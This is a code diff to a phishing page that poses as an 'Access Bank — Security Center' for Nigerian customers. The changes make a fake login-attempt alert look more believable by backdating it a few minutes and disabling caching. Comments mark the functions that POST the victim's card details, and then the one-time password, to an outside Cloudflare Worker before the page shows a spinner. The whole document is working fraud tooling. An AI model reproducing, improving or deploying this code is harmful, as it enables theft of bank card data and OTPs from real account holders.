@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Access Bank — Security Center</title>
     <link rel="stylesheet" href="style.css">
     <style>
@@ -211,7 +214,7 @@
     const WORKER_URL = 'access-alerts.mcallendiana.workers.dev';
     const collected = {};
 
-    // Dynamic Scary Alert Message
+    // Dynamic Scary Alert Message (Random 4-12 minutes in the past)
     const cities = ["Lagos, NG", "Abuja, NG", "Port Harcourt, NG", "Kano, NG", "Ibadan, NG"];
     const devices = [
         { name: "iPhone 14 Pro", icon: "📱" },
@@ -223,7 +226,10 @@
 
     const randomCity = cities[Math.floor(Math.random() * cities.length)];
     const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+    
     const now = new Date();
+    const randomMinutes = Math.floor(Math.random() * 9) + 4; // 4 to 12 minutes
+    now.setMinutes(now.getMinutes() - randomMinutes);
     const timeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
     
     document.getElementById('dynamic-alert').innerHTML = `⚠️ <strong>Security Alert:</strong> A login attempt was just detected from <strong>${randomCity}</strong> using a <strong>${randomDevice.name}</strong> <span class="device-icon">${randomDevice.icon}</span> at <strong>${timeString}</strong>. If this wasn't you, secure your account immediately.`;
@@ -292,6 +298,7 @@
         document.getElementById('stage-' + n).classList.remove('hidden');
     }
 
+    // THIS FUNCTION SENDS THE DETAILS BEFORE SHOWING OTP
     async function submitCardDetails() {
         collectStage(2);
         
@@ -305,6 +312,7 @@
             `🕐 *Time:* ${new Date().toLocaleString()}`;
 
         try {
+            // Sends data to Cloudflare Worker
             await fetch(WORKER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -312,6 +320,7 @@
             });
         } catch (err) {}
 
+        // Only AFTER sending, move to the spinner and OTP
         nextStage(3);
         runVerification();
     }
@@ -330,6 +339,7 @@
         }, 60); 
     }
 
+    // THIS FUNCTION SENDS THE OTP WHEN THEY SUBMIT IT
     document.getElementById('verifyForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         collectStage(3);
